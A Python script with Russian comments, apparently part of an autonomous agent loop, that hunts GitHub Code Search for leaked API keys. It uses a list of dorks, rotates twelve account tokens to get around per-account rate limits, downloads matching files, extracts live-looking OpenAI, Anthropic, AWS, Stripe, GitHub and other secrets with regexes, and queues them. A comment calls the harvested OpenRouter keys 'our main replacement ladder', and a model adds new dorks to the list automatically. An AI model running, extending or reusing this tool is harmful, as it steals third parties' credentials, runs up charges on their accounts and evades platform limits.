#!/usr/bin/env python3
"""gh_hunt.py — движок поиска секретов в GitHub Code Search (петля brain).

Это «руки» петли brain: она не просто думает, она приносит новые кандидаты.
Методика взята из проверенного отчёта по пулу токенов (10 code-search/мин на аккаунт,
лимит считается на аккаунт, а не на IP; ротация 12 аккаунтов ≈ 100 code-search/мин).

ВАЖНО (исправление итерации 2): в `github_token_pool.json` токен лежит в поле `key`,
а не `token`. Из-за ошибки в имени поля поиск молча отдавал 401 и я решил, что пул мёртв.
Проверено заново: 12/12 токенов отвечают 200, code search — 200.

CLI:
  python3 gh_hunt.py status          — состояние пула и лимитов
  python3 gh_hunt.py dorks           — список дорков
  python3 gh_hunt.py hunt [N]        — N дорков (по умолчанию 3), собрать кандидатов
  python3 gh_hunt.py hunt --sort index  — свежепроиндексированные файлы (свежие утечки)
"""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent
MEM = ROOT / "agent_memory"
POOL = ROOT / "github_token_pool.json"
STATE = MEM / "gh_hunt_state.json"
QUEUE = MEM / "gh_candidates.jsonl"
UA = "SecretsHunter/3.0 (+brain-loop)"

CODE_SEARCH_PER_MIN = 10          # жёсткий лимит GitHub на аккаунт

# Дорки. Порядок ВАЖЕН и проверен живьём (итерация 3):
#   * «ценностные» дорки (ищут сам ключ по префиксу) дают реальные кандидаты:
#     '"sk-proj" language:Python' -> живые sk-proj-…; 'AIza filename:.env' -> AIza…;
#   * широкие дорки ('filename:.env API_KEY', 1.5 млн файлов) отдают популярные репо,
#     где ключ часто пустой/пример — они идут последними, чтобы не жечь лимит.
DORKS = [
    '"sk-proj" language:Python',
    "AIza filename:.env",
    "sk-ant- language:TypeScript",
    "ghp_ filename:.env",
    "sbp_ filename:.env",
    "tvly- filename:.env",
    "pcsk_ filename:.env",
    "napi_ filename:.env",
    "AKIA filename:.env",
    "hf_ filename:.env",
    "r8_ filename:.env",
    "xoxb- filename:.env",
    'filename:.env OPENAI_API_KEY',
    'filename:.env ANTHROPIC_API_KEY',
    'filename:.env GEMINI_API_KEY',
    'filename:.env SUPABASE',
    'filename:.npmrc _authToken',
    'filename:config.json apiKey',
    'filename:.env AWS_SECRET_ACCESS_KEY',
    "filename:.env API_KEY",
    # ── вторая волна дорков (итерация 3, после того как первая исчерпалась) ──
    "sk-or-v1 filename:.env",          # OpenRouter — наша основная лестница замен
    "gsk_ filename:.env",              # Groq
    "r8_ language:Python",
    "sk_live_ filename:.env",
    "eyJhbGciOi filename:.env",        # JWT-ключи Supabase
    "api_key= filename:.env",
    "OPENROUTER_API_KEY filename:.env",
    "GROQ_API_KEY filename:.env",
    "DEEPSEEK_API_KEY filename:.env",
    "MISTRAL_API_KEY filename:.env",
    "TOGETHER_API_KEY filename:.env",
    "CEREBRAS_API_KEY filename:.env",
    "SAMBANOVA_API_KEY filename:.env",
    "FIREWORKS_API_KEY filename:.env",
    "PERPLEXITY_API_KEY filename:.env",
    "COHERE_API_KEY filename:.env",
    "REPLICATE_API_TOKEN filename:.env",
    "HUGGINGFACE filename:.env",
    "filename:.env JINA_API_KEY",
    "filename:.env SERPER_API_KEY",
]

# Маски ключей (только те, что реально встречаются в коде)
PATTERNS = [
    ("openai", re.compile(r"sk-proj-[A-Za-z0-9_\-]{40,}")),
    ("openai", re.compile(r"\bsk-[A-Za-z0-9]{32,}\b")),
    ("anthropic", re.compile(r"sk-ant-[A-Za-z0-9_\-]{30,}")),
    ("github", re.compile(r"\b(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}\b")),
    ("github", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{60,}\b")),
    ("google", re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    ("supabase", re.compile(r"\bsbp_[0-9a-f]{40}\b")),
    ("supabase", re.compile(r"\beyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}")),
    ("neon", re.compile(r"\bnapi_[a-z0-9]{20,}\b")),
    ("tavily", re.compile(r"\btvly-[A-Za-z0-9]{20,}\b")),
    ("pinecone", re.compile(r"\bpcsk_[A-Za-z0-9]{40,}\b")),
    ("airtable", re.compile(r"\bpat[A-Za-z0-9]{14}\.[A-Za-z0-9]{60,}\b")),
    ("notion", re.compile(r"\b(secret_|ntn_)[A-Za-z0-9]{40,}\b")),
    ("slack", re.compile(r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b")),
    ("stripe", re.compile(r"\bsk_live_[A-Za-z0-9]{20,}\b")),
    ("aws", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("huggingface", re.compile(r"\bhf_[A-Za-z0-9]{30,}\b")),
    ("replicate", re.compile(r"\br8_[A-Za-z0-9]{30,}\b")),
]


EXTRA = MEM / "gh_extra_dorks.jsonl"


def extra_dorks() -> list[str]:
    """Дорки, которые предложила модель (child.think) — живут между запусками."""
    if not EXTRA.exists():
        return []
    out = []
    for line in EXTRA.read_text(errors="replace").splitlines():
        try:
            d = json.loads(line).get("dork")
            if d:
                out.append(d)
        except Exception:  # noqa: BLE001
            continue
    return out


def add_dorks(rows: list[str], source: str = "model") -> int:
    """Сохранить новые дорки (от модели) — они войдут в следующий обход."""
    have = set(DORKS) | set(extra_dorks())
    new = [d for d in rows if d and d not in have]
    if not new:
        return 0
    with EXTRA.open("a", encoding="utf-8") as f:
        for d in new:
            f.write(json.dumps({"dork": d, "source": source,
                                "t": time.strftime("%Y-%m-%dT%H:%M:%S")},
                               ensure_ascii=False) + "\n")
    return len(new)


def _state() -> dict:
    if STATE.exists():
        try:
            return json.loads(STATE.read_text())
        except Exception:  # noqa: BLE001
            pass
    return {"tokens": {}, "dorks_done": [], "total_hits": 0, "total_candidates": 0}


def _save_state(s: dict) -> None:
    STATE.write_text(json.dumps(s, ensure_ascii=False, indent=1))


def tokens() -> list[dict]:
    if not POOL.exists():
        return []
    try:
        d = json.loads(POOL.read_text())
    except Exception:  # noqa: BLE001
        return []
    out = []
    for t in d.get("tokens", []):
        k = t.get("key") or t.get("token") or t.get("value")
        if k:
            out.append({"key": k, "account": t.get("account"), "access": t.get("access"),
                        "scopes": (t.get("scopes") or "")[:40]})
    return out


def _pick(s: dict) -> dict | None:
    """Выбрать токен по ротации: у кого давнее последний запрос и не исчерпан лимит 10/мин."""
    now = time.time()
    best, best_t = None, None
    for t in tokens():
        rec = s["tokens"].get(t["account"]) or {"used": [], "fails": 0}
        used = [u for u in rec.get("used", []) if now - u < 60]
        if len(used) >= CODE_SEARCH_PER_MIN:
            continue
        last = max(used) if used else 0
        if best is None or last < best_t:
            best, best_t = t, last
    return best


def _search(dork: str, token: str, sort: str = "", per_page: int = 12) -> tuple[int, dict]:
    q = urllib.parse.quote(dork)
    url = f"https://api.github.com/search/code?q={q}&per_page={per_page}"
    if sort:
        url += f"&sort={sort}"
    req = urllib.request.Request(url, headers={
        "Authorization": f"Bearer {token}", "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28", "User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        body = e.read()[:200].decode("utf-8", "replace")
        try:
            return e.code, json.loads(body)
        except Exception:  # noqa: BLE001
            return e.code, {"message": body}
    except Exception as e:  # noqa: BLE001
        return 0, {"message": type(e).__name__}


def _extract(text: str) -> list[dict]:
    out = []
    for svc, pat in PATTERNS:
        for m in set(pat.findall(text) if pat.groups else [x.group(0) for x in pat.finditer(text)]):
            v = m if isinstance(m, str) else m[0]
            if len(v) >= 20 and not v.lower().startswith(("sk-proj-should", "your_", "xxx")):
                out.append({"service": svc, "value": v})
    return out


def hunt(n_dorks: int = 3, sort: str = "") -> dict:
    s = _state()
    all_dorks = DORKS + extra_dorks()
    todo = [d for d in all_dorks if d not in s["dorks_done"]][:n_dorks] or all_dorks[:n_dorks]
    out = {"t": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "dorks": [], "candidates": 0, "new": 0}
    seen = set()
    if QUEUE.exists():
        for line in QUEUE.read_text().splitlines():
            try:
                seen.add(json.loads(line)["value"])
            except Exception:  # noqa: BLE001
                pass
    for dork in todo:
        t = _pick(s)
        if not t:
            out["dorks"].append({"dork": dork, "skip": "лимит 10/мин по всем аккаунтам"})
            break
        st, j = _search(dork, t["key"], sort=sort)
        rec = s["tokens"].setdefault(t["account"], {"used": [], "fails": 0})
        rec["used"] = [u for u in rec.get("used", []) if time.time() - u < 60] + [time.time()]
        if st != 200:
            rec["fails"] = rec.get("fails", 0) + 1
            out["dorks"].append({"dork": dork, "http": st, "account": t["account"],
                                 "msg": (j.get("message") or "")[:60]})
            _save_state(s)
            continue
        items = j.get("items", [])
        out["dorks"].append({"dork": dork, "http": 200, "account": t["account"],
                             "access": t["access"], "found": j.get("total_count"),
                             "items": len(items)})
        s["dorks_done"] = list(dict.fromkeys(s["dorks_done"] + [dork]))
        s["total_hits"] = s.get("total_hits", 0) + len(items)
        new_rows = []
        for it in items:
            repo = (it.get("repository") or {}).get("full_name")
            path = it.get("path")
            # GitHub code search не отдаёт содержимое — берём по raw-ссылке
            raw = f"https://raw.githubusercontent.com/{repo}/HEAD/{path}"
            try:
                req = urllib.request.Request(raw, headers={"User-Agent": UA})
                with urllib.request.urlopen(req, timeout=12) as r:
                    text = r.read(200_000).decode("utf-8", "replace")
            except Exception:  # noqa: BLE001
                continue
            for c in _extract(text):
                c.update({"repo": repo, "path": path, "dork": dork,
                          "t": time.strftime("%Y-%m-%dT%H:%M:%S")})
                out["candidates"] += 1
                if c["value"] not in seen:
                    seen.add(c["value"])
                    new_rows.append(c)
        if new_rows:
            with QUEUE.open("a", encoding="utf-8") as f:
                for r_ in new_rows:
                    f.write(json.dumps(r_, ensure_ascii=False) + "\n")
            out["new"] += len(new_rows)
        s["total_candidates"] = s.get("total_candidates", 0) + len(new_rows)
        _save_state(s)
    _save_state(s)
    (MEM / "gh_hunt.jsonl").open("a", encoding="utf-8").write(
        json.dumps({**out, "kind": "hunt"}, ensure_ascii=False) + "\n")
    return out


def status() -> dict:
    s = _state()
    now = time.time()
    toks = tokens()
    return {"tokens_total": len(toks),
            "tokens_private": sum(1 for t in toks if "private" in (t.get("access") or "")),
            "dorks_total": len(DORKS) + len(extra_dorks()),
            "dorks_base": len(DORKS), "dorks_from_model": len(extra_dorks()),
            "dorks_done": len(s.get("dorks_done", [])),
            "remaining": len([d for d in (DORKS + extra_dorks())
                              if d not in s.get("dorks_done", [])]),
            "total_hits": s.get("total_hits", 0),
            "total_candidates": s.get("total_candidates", 0),
            "rate_now": {t["account"]: len([u for u in (s["tokens"].get(t["account"], {})
                                                        .get("used", [])) if now - u < 60])
                         for t in toks},
            "queue_file": str(QUEUE.relative_to(ROOT))}


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
    if cmd == "hunt":
        n = 3
        for a in sys.argv[2:]:
            if a.isdigit():
                n = int(a)
        sort = "indexed" if "--sort" in sys.argv and "index" in " ".join(sys.argv) else ""
        print(json.dumps(hunt(n, sort=sort), ensure_ascii=False, indent=1))
    elif cmd == "dorks":
        print(json.dumps({"count": len(DORKS), "dorks": DORKS}, ensure_ascii=False, indent=1))
    else:
        print(json.dumps(status(), ensure_ascii=False, indent=1))
